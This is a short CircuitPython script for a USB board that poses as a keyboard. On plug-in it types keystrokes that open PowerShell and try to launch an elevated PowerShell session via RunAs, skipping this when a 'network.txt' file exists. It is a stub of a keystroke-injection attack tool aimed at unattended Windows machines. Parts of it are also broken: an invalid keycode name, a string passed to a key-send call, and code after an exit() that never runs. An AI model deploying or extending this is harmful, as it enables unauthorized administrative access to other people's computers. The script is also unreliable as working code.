import time
import os
import usb_hid
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

time.sleep(3) 

if not 'network.txt' in os.listdir():
    time.sleep(1.5)
    keyboard = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(keyboard)

    keyboard.send(Keycode.WINDOWS)
    time.sleep(0.60)

    layout.write("powershell\n")

    time.sleep(1.0)
    keyboard.send(Keycode.ENTER)
    time.sleep(0.30)
    keyboard.send(Keycode._ARROW)
    time.sleep(0.30) 
    keyboard.send(Keycode.ENTER)
    time.sleep(0.30)  
    keyboard = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(keyboard)
    keyboard.send(Keycode.ENTER)
    time.sleep(0.17)
       
    layout.write(" powershell -Command Start-Process powershell -Verb RunAs \n")
    keyboard.send("enter")
    keyboard.send(Keycode._ARROW)
    time.sleep(1.5)
    exit()
    
    keyboard.send(Keycode.ALT, Keycode.F4)


